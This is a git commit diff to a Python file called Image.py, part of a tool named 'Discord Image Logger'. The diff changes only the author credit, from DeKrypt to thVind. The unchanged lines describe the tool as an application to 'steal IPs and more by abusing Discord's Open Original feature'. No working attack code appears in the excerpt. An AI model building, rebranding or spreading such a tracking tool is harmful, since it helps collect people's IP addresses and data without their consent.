1bd39ee81efaf6fa7400c406febc94237f0680f0
thVind <kaden.wadood@gmail.com>
2025-11-24 02:29:34 +0000

    Update Image.py

--- api/Image.py
+++ api/Image.py
@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# By thVind | https://github.com/thVind
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "thVind"
 
 config = {
     # BASE CONFIG #
